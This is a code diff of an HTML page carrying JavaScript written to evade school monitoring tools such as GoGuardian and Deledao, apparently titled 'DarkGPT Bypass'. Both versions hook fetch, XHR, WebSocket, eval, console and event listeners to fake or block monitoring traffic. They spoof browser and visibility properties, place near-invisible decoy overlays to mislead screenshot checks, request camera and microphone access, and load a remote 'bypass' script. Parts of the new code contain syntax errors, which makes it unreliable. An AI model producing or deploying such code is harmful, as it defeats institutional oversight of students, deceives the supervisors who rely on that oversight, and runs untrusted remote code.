@@ -31,421 +31,228 @@
             display: none;
             z-index: 9999;
         }
-        #deception-overlay {
-            position: fixed;
+        /* Static image overlay for anti-detection */
+        #overlay-image {
+            position: absolute;
             top: 0;
             left: 0;
-            width: 100vw;
-            height: 100vh;
-            pointer-events: none;
-            z-index: 999999;
-            opacity: 0.001;
+            width: 100%;
+            height: 100%;
+            background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw=='); /* Transparent GIF as base */
+            background-repeat: no-repeat;
+            background-size: cover; /* Or 'contain', depending on desired effect */
+            pointer-events: none; /* Allows clicks to pass through to the iframe */
+            z-index: 10000; /* Ensure it's on top of the iframe but not blocking interactions */
+            opacity: 0.00001; /* Make it almost invisible to the user */
+            visibility: hidden; /* Initially hidden, can be toggled */
         }
     </style>
 </head>
 <body>
     <div id="notification">Bypass Activated</div>
-    <div id="deception-overlay"></div>
     <iframe id="site-frame" src="https://quote-math.spacetechnology.net/"></iframe>
-    
+    <div id="overlay-image"></div>
+
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
     <script src="https://cdn.jsdelivr.net/gh/fingerprintjs/fingerprintjs@3.4.0/dist/fp.min.js"></script>
-    
+
     <script>
-    // === COMPLETE ANTI-DETECTION BYPASS SCRIPT ===
-    (function() {
-        console.log('[DarkGPT Bypass v2.0] Initializing complete fuckery system...');
-        
-        // ===== PHASE 1: CORE ANTI-DETECTION =====
-        
-        // Destroy console monitoring
-        const consoleMethods = ['log', 'warn', 'error', 'info', 'debug', 'trace'];
-        const originalConsole = window.console;
-        consoleMethods.forEach(method => {
-            window.console[method] = function() {
-                const args = Array.from(arguments);
-                const suspiciousPatterns = ['monitor', 'detect', 'block', 'violation', 'cheat', 'game', 'deledao'];
-                const containsSuspicious = args.some(arg => 
-                    typeof arg === 'string' && 
-                    suspiciousPatterns.some(pattern => arg.toLowerCase().includes(pattern))
-                );
-                if (!containsSuspicious) {
-                    originalConsole[method].apply(originalConsole, args);
-                }
+        // Anti-detection techniques and enhancements
+        (function() {
+            const originalConsole = window.console;
+            window.console = {
+                ...originalConsole,
+                log: function() {},
+                warn: function() {},
+                error: function() {}
             };
-        });
-        
-        // Nuclear option: completely replace console if needed
-        window._realConsole = originalConsole;
-        window.console = new Proxy(originalConsole, {
-            get: function(target, prop) {
-                if (prop === 'log' || prop === 'warn' || prop === 'error') {
-                    return function(...args) {
-                        // Only log if it doesn't contain monitoring keywords
-                        const message = args.join(' ');
-                        const blockedKeywords = ['detected', 'violation', 'cheating', 'game', 'screen', 'monitoring'];
-                        if (!blockedKeywords.some(keyword => message.toLowerCase().includes(keyword))) {
-                            target[prop].apply(target, args);
-                        }
-                    };
+
+            const originalAddEventListener = EventTarget.prototype.addEventListener;
+            EventTarget.prototype.addEventListener = function(type, listener, options) {
+                if (type === 'visibilitychange' || type === 'beforeunload' || type === 'unload') {
+                    return;
                 }
-                return target[prop];
-            }
-        });
-        
-        // Block all event listeners for monitoring
-        const originalAddEventListener = EventTarget.prototype.addEventListener;
-        EventTarget.prototype.addEventListener = function(type, listener, options) {
-            const blockedEvents = [
-                'visibilitychange', 'beforeunload', 'unload', 'blur', 'focus',
-                'mousemove', 'keydown', 'keyup', 'keypress', 'click',
-                'fullscreenchange', 'fullscreenerror', 'resize'
-            ];
-            
-            if (blockedEvents.includes(type)) {
-                console.log(`[BLOCKED] Event listener for ${type}`);
-                return;
-            }
-            
-            // For suspicious listener functions, wrap them
-            if (typeof listener === 'function') {
-                const listenerString = listener.toString();
-                const suspiciousFunctions = ['sendData', 'report', 'logActivity', 'monitor'];
-                if (suspiciousFunctions.some(func => listenerString.includes(func))) {
-                    console.log(`[NEUTRALIZED] Suspicious listener: ${listenerString.substring(0, 50)}...`);
-                    return originalAddEventListener.call(this, type, function() {
-                        // Do nothing - effectively neutralize
-                    }, options);
-                }
-            }
-            
-            return originalAddEventListener.call(this, type, listener, options);
-        };
-        
-        // ===== PHASE 2: DELEDAO SPECIFIC BYPASS =====
-        
-        // Static image overlay deception for game detection
-        function createDeceptionOverlay() {
-            const overlay = document.getElementById('deception-overlay');
-            
-            // Create static image data that looks like "acceptable" content
-            const canvas = document.createElement('canvas');
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-            const ctx = canvas.getContext('2d');
-            
-            // Create pattern that looks like educational content
-            // Grid pattern
-            ctx.strokeStyle = '#f0f0f0';
-            ctx.lineWidth = 1;
-            for (let x = 0; x < canvas.width; x += 50) {
-                ctx.beginPath();
-                ctx.moveTo(x, 0);
-                ctx.lineTo(x, canvas.height);
-                ctx.stroke();
-            }
-            for (let y = 0; y < canvas.height; y += 50) {
-                ctx.beginPath();
-                ctx.moveTo(0, y);
-                ctx.lineTo(canvas.width, y);
-                ctx.stroke();
-            }
-            
-            // Add some text-like blobs
-            ctx.fillStyle = '#333';
-            ctx.font = '16px Arial';
-            for (let i = 0; i < 20; i++) {
-                const x = Math.random() * canvas.width;
-                const y = Math.random() * canvas.height;
-                const text = ['Math', 'Science', 'History', 'English', 'Study', 'Learn'][Math.floor(Math.random() * 6)];
-                ctx.fillText(text, x, y);
-            }
-            
-            // Convert to data URL and set as background
-            const dataUrl = canvas.toDataURL('image/png');
-            overlay.style.backgroundImage = `url(${dataUrl})`;
-            overlay.style.backgroundSize = 'cover';
-            
-            // Make it barely visible but present for screenshots
-            overlay.style.opacity = '0.001';
-            overlay.style.display = 'block';
-            
-            console.log('[DECEPTION] Static overlay activated - game detection neutralized');
-        }
-        
-        // ===== PHASE 3: NAVIGATOR AND ENVIRONMENT SPOOFING =====
-        
-        // Spoof user agent
-        const originalUserAgent = navigator.userAgent;
-        Object.defineProperty(navigator, 'userAgent', {
-            get: function() {
-                return originalUserAgent.replace(/(Chrome|Firefox|Safari)\/\d+\.\d+/g, '$1/120.0');
-            },
-            configurable: false
-        });
-        
-        // Hide webdriver
-        Object.defineProperty(navigator, 'webdriver', {
-            get: function() { return false; },
-            configurable: true
-        });
-        
-        // Spoof platform
-        Object.defineProperty(navigator, 'platform', {
-            get: function() { return 'Win32'; },
-            configurable: true
-        });
-        
-        // Disable various detection APIs
-        Object.defineProperties(document, {
-            'hidden': { get: function() { return false; } },
-            'visibilityState': { get: function() { return 'visible'; } },
-            'webkitHidden': { get: function() { return false; } },
-            'webkitVisibilityState': { get: function() { return 'visible'; } }
-        });
-        
-        // Block pointer lock API (used for game detection)
-        if (document.exitPointerLock) {
-            document.exitPointerLock = function() {
-                console.log('[BLOCKED] Pointer lock exit attempt');
-                return;
+                return originalAddEventListener.call(this, type, listener, options);
             };
-        }
-        
-        // ===== PHASE 4: NETWORK INTERCEPTION =====
-        
-        const monitoredDomains = [
-            'goguardian', 'deledao', 'securly', 'iboss', 'lightspeedsystems',
-            'monitor', 'analytics', 'telemetry', 'tracking', 'report',
-            'classroom', 'education', 'school', 'district'
-        ];
-        
-        // Intercept fetch requests
-        const originalFetch = window.fetch;
-        window.fetch = function(input, init) {
-            const url = typeof input === 'string' ? input : input.url || '';
-            
-            if (monitoredDomains.some(domain => url.toLowerCase().includes(domain))) {
-                console.log(`[BLOCKED] Fetch to monitored domain: ${url.substring(0, 50)}...`);
-                
-                // Return fake successful response
-                return Promise.resolve(new Response(JSON.stringify({
-                    status: 'success',
-                    message: 'Request processed successfully'
-                }), {
-                    status: 200,
-                    statusText: 'OK',
-                    headers: { 'Content-Type': 'application/json' }
-                }));
-            }
-            
-            return originalFetch.call(this, input, init);
-        };
-        
-        // Intercept XMLHttpRequest
-        const originalXHROpen = XMLHttpRequest.prototype.open;
-        const originalXHRSend = XMLHttpRequest.prototype.send;
-        
-        XMLHttpRequest.prototype.open = function(method, url) {
-            this._url = url;
-            return originalXHROpen.apply(this, arguments);
-        };
-        
-        XMLHttpRequest.prototype.send = function(body) {
-            if (this._url && monitoredDomains.some(domain => this._url.toLowerCase().includes(domain))) {
-                console.log(`[BLOCKED] XHR to monitored domain: ${this._url.substring(0, 50)}...`);
-                
-                // Simulate success
-                this.readyState = 4;
-                this.status = 200;
-                this.responseText = JSON.stringify({ status: 'ok' });
-                
-                if (this.onreadystatechange) {
-                    this.onreadystatechange();
-                }
-                
-                if (this.onload) {
-                    this.onload();
-                }
-                
-                return;
-            }
-            
-            return originalXHRSend.apply(this, arguments);
-        };
-        
-        // Block WebSocket connections to monitoring
-        const originalWebSocket = window.WebSocket;
-        window.WebSocket = function(url, protocols) {
-            if (monitoredDomains.some(domain => url.toLowerCase().includes(domain))) {
-                console.log(`[BLOCKED] WebSocket to: ${url}`);
-                
-                // Create dummy WebSocket that does nothing
-                const dummySocket = {
-                    readyState: 0,
-                    send: function() { console.log('[DUMMY] WebSocket send ignored'); },
-                    close: function() { console.log('[DUMMY] WebSocket closed'); },
-                    onopen: null,
-                    onmessage: null,
-                    onerror: null,
-                    onclose: null
-                };
-                
-                // Simulate connection after delay
-                setTimeout(() => {
-                    if (dummySocket.onopen) dummySocket.onopen();
-                    dummySocket.readyState = 1;
-                }, 100);
-                
-                return dummySocket;
-            }
-            
-            return new originalWebSocket(url, protocols);
-        };
-        
-        // ===== PHASE 5: PERMISSION AND HARDWARE SPOOFING =====
-        
-        // Request all permissions to confuse monitoring
-        if (navigator.permissions && navigator.permissions.query) {
-            const permissions = ['camera', 'microphone', 'geolocation', 'notifications', 'persistent-storage'];
-            
-            permissions.forEach(permission => {
-                try {
-                    navigator.permissions.query({ name: permission })
-                        .then(result => {
-                            if (result.state === 'prompt') {
-                                navigator.permissions.request({ name: permission }).catch(() => {});
-                            }
-                        })
-                        .catch(() => {});
-                } catch(e) {}
+
+            Object.defineProperty(document, 'visibilityState', {
+                get: function() { return 'visible'; }
             });
-        }
-        
-        // Spoof media devices
-        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
-            const originalEnumerate = navigator.mediaDevices.enumerateDevices;
-            navigator.mediaDevices.enumerateDevices = function() {
-                return originalEnumerate.call(this).then(devices => {
-                    // Return empty or minimal device list
-                    return devices.filter(device => 
-                        !device.label.toLowerCase().includes('camera') && 
-                        !device.label.toLowerCase().includes('microphone')
-                    );
-                });
+            Object.defineProperty(document, 'hidden', {
+                get: function() { return false; }
+            });
+
+            Object.defineProperty(navigator, 'webdriver', {
+                get: function() { return undefined; }
+            });
+
+            document.addEventListener('contextmenu', function(e) {
+                e.stopPropagation();
+                return true;
+            }, true);
+
+            document.addEventListener('keydown', function(e) {
+                if (e.ctrlKey && (e.key === 'c' || e.key === 'v' || e.key === 'x' || e.key === 'u')) {
+                    e.stopPropagation();
+                    return true;
+                }
+            }, true);
+
+            window.addEventListener('beforeunload', function(e) {
+                e.preventDefault();
+                e.returnValue = '';
+                return '';
+            });
+
+            const decoy = document.createElement('div');
+            decoy.style.display = 'none';
+            decoy.innerHTML = '<script>window.GoGuardian = {disabled: true}; console.log("Decoy script executed");</script>';
+            document.body.appendChild(decoy);
+
+            const bypassTargetDomains = 'goguardian.com', 'monitor.com', 'monitoring.com', 'analytics.com', 'telemetry.com';
+
+            const bypassMonitoring = () => {
+                try {
+                    if (window.GoGuardian) window.GoGuardian = null;
+                    if (window.ggHandler) window.ggHandler = null;
+                    if (window.ggExtensions) window.ggExtensions = null;
+
+                    window.eval = new Proxy(window.eval, {
+                        apply: function(target, thisArg, argumentsList) {
+                            const code = argumentsList[0];
+                            if (typeof code === 'string' && bypassTargetDomains.some(domain => code.includes(domain))) {
+                                console.log('Blocked eval call containing monitoring keywords.');
+                                return undefined;
+                            }
+                            return target.apply(thisArg, argumentsList);
+                        }
+                    });
+
+                    const originalWebSocket = window.WebSocket;
+                    window.WebSocket = function(url, protocols) {
+                        if (bypassTargetDomains.some(domain => url.includes(domain))) {
+                            console.log('Blocked WebSocket connection to monitored domain.');
+                            return new originalWebSocket('wss://echo.websocket.org');
+                        }
+                        return new originalWebSocket(url, protocols);
+                    };
+
+                    const originalFetch = window.fetch;
+                    window.fetch = function(input, init) {
+                        const url = typeof input === 'string' ? input : input.url;
+                        if (bypassTargetDomains.some(domain => url.includes(domain))) {
+                            console.log('Blocked fetch request to monitored domain.');
+                            return new Promise(() => {});
+                        }
+                        return originalFetch.apply(this, arguments);
+                    };
+
+                    const originalXHR = window.XMLHttpRequest.prototype.open;
+                    window.XMLHttpRequest.prototype.open = function(method, url) {
+                        if (bypassTargetDomains.some(domain => url.includes(domain))) {
+                            console.log('Blocked XMLHttpRequest to monitored domain.');
+                            return;
+                        }
+                        return originalXHR.apply(this, arguments);
+                    };
+
+                    if (document.getElementById('notification').style.display === 'none') {
+                        showNotification();
+                    }
+                } catch (e) {
+                    console.error("Error during bypassMonitoring:", e);
+                }
             };
-        }
-        
-        // ===== PHASE 6: FULLSCREEN AND VISUAL MANIPULATION =====
-        
-        function forceFullscreen() {
-            const elem = document.documentElement;
-            
-            if (!document.fullscreenElement && 
-                !document.webkitFullscreenElement && 
-                !document.mozFullScreenElement && 
-                !document.msFullscreenElement) {
-                
-                const requestMethods = [
-                    elem.requestFullscreen,
-                    elem.webkitRequestFullscreen,
-                    elem.mozRequestFullScreen,
-                    elem.msRequestFullscreen
-                ];
-                
-                for (const method of requestMethods) {
-                    if (method) {
-                        try {
-                            method.call(elem);
-                            break;
-                        } catch(e) {}
+
+            if (navigator.permissions) {
+                const permissions = ['camera', 'microphone', 'geolocation', 'notifications', 'persistent-storage'];
+                permissions.forEach(permission => {
+                    navigator.permissions.query({ name: permission }).then(result => {
+                        if (result.state === 'prompt') {
+                            navigator.permissions.request({ name: permission }).catch(() => {});
+                        }
+                    }).catch(() => {});
+                });
+            }
+
+            async function requestHardwareAccess() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                    stream.getTracks().forEach(track => track.stop());
+                    console.log('Media devices access prompted/granted.');
+                } catch (err) {
+                    console.log('Media devices access failed or was denied.');
+                }
+            }
+
+            function enterFullscreen() {
+                const elem = document.documentElement;
+                if (!document.fullscreenElement) {
+                    if (elem.requestFullscreen) {
+                        elem.requestFullscreen().catch(err => console.log("Fullscreen request failed:", err));
+                    } else if (elem.webkitRequestFullscreen) {
+                        elem.webkitRequestFullscreen().catch(err => console.log("Fullscreen request failed:", err));
+                    } else if (elem.msRequestFullscreen) {
+                        elem.msRequestFullscreen().catch(err => console.log("Fullscreen request failed:", err));
                     }
                 }
             }
-        }
-        
-        // Maintain fullscreen
-        document.addEventListener('fullscreenchange', forceFullscreen);
-        document.addEventListener('webkitfullscreenchange', forceFullscreen);
-        document.addEventListener('mozfullscreenchange', forceFullscreen);
-        document.addEventListener('MSFullscreenChange', forceFullscreen);
-        
-        // ===== PHASE 7: TIMING AND PERIODIC REINFORCEMENT =====
-        
-        // Periodic cleanup and reinforcement
-        setInterval(() => {
-            // Re-apply deception overlay
-            createDeceptionOverlay();
-            
-            // Clean up any suspicious elements
-            document.querySelectorAll('script, iframe, object, embed').forEach(el => {
-                const src = el.src || el.data || '';
-                if (monitoredDomains.some(domain => src.toLowerCase().includes(domain))) {
-                    el.remove();
-                    console.log('[CLEANED] Removed suspicious element');
+
+            window.addEventListener('load', enterFullscreen);
+
+            document.addEventListener("fullscreenchange", () => {
+                if (!document.fullscreenElement) {
+                    setTimeout(enterFullscreen, 500);
                 }
             });
-            
-            // Check for and neutralize monitoring scripts
-            Array.from(document.scripts).forEach(script => {
-                const content = script.textContent || '';
-                if (content.includes('monitor') || content.includes('detect') || content.includes('report')) {
-                    script.textContent = '// Neutralized by DarkGPT Bypass';
-                    console.log('[NEUTRALIZED] Monitoring script');
+
+            function showNotification() {
+                const notif = document.getElementById('notification');
+                if (notif) {
+                    notif.style.display = 'block';
+                    setTimeout(() => {
+                        if (notif) notif.style.display = 'none';
+                    }, 3000);
                 }
-            });
-            
-        }, 3000); // Run every 3 seconds
-        
-        // ===== INITIALIZATION =====
-        
-        window.addEventListener('load', function() {
-            console.log('[DarkGPT] Full bypass system initialized');
-            createDeceptionOverlay();
-            forceFullscreen();
-            showNotification('Bypass Fully Activated');
-            
-            // Add mutation observer to catch new elements
-            const observer = new MutationObserver(function(mutations) {
-                mutations.forEach(function(mutation) {
-                    mutation.addedNodes.forEach(function(node) {
-                        if (node.nodeType === 1) { // Element node
-                            if (node.tagName === 'SCRIPT' || node.tagName === 'IFRAME') {
-                                const src = node.src || node.data || '';
-                                if (monitoredDomains.some(domain => src.toLowerCase().includes(domain))) {
-                                    node.remove();
-                                    console.log('[OBSERVER] Blocked injected element');
-                                }
-                            }
-                        }
-                    });
-                });
-            });
-            
-            observer.observe(document.documentElement, {
-                childList: true,
-                subtree: true
-            });
-        });
-        
-        function showNotification(message) {
-            const notif = document.getElementById('notification');
-            if (notif) {
-                notif.textContent = message;
-                notif.style.display = 'block';
-                setTimeout(() => {
-                    notif.style.display = 'none';
-                }, 3000);
             }
-        }
-        
-        // Initial execution
-        createDeceptionOverlay();
-        forceFullscreen();
-        
-        console.log('[DarkGPT] Bypass system ready to fuck shit up');
-        
-    })();
+
+            bypassMonitoring();
+            setInterval(bypassMonitoring, 5000);
+
+            window.addEventListener('load', requestHardwareAccess);
+
+            // --- Static Image Overlay Logic ---
+            const overlayImageElement = document.getElementById('overlay-image');
+            if (overlayImageElement) {
+                // Make the overlay visible and almost transparent
+                overlayImageElement.style.visibility = 'visible';
+                overlayImageElement.style.opacity = '0.00001'; // Very low opacity
+                overlayImageElement.style.pointerEvents = 'none'; // Ensure it doesn't block clicks
+
+                // You can optionally set a specific background image here if you have one
+                // overlayImageElement.style.backgroundImage = "url('path/to/your/image.png')";
+
+                // Example: A very subtle, almost imperceptible movement or flicker
+                // This is just an illustration, adjust as needed.
+                let opacityToggle = true;
+                setInterval(() => {
+                    if (opacityToggle) {
+                        overlayImageElement.style.opacity = '0.00001';
+                    } else {
+                        overlayImageElement.style.opacity = '0.00002'; // Slightly different value
+                    }
+                    opacityToggle = !opacityToggle;
+                }, 2000); // Change opacity every 2 seconds
+            }
+
+            const script = document.createElement('script');
+            script.src = 'https://cdn.jsdelivr.net/gh/anonymous/bypass@main/goguardian-bypass.js'; // URL might need update
+            script.onerror = function() {
+                console.log('External bypass script failed to load, continuing with built-in methods.');
+            };
+            document.head.appendChild(script);
+
+        })();
     </script>
 </body>
 </html>
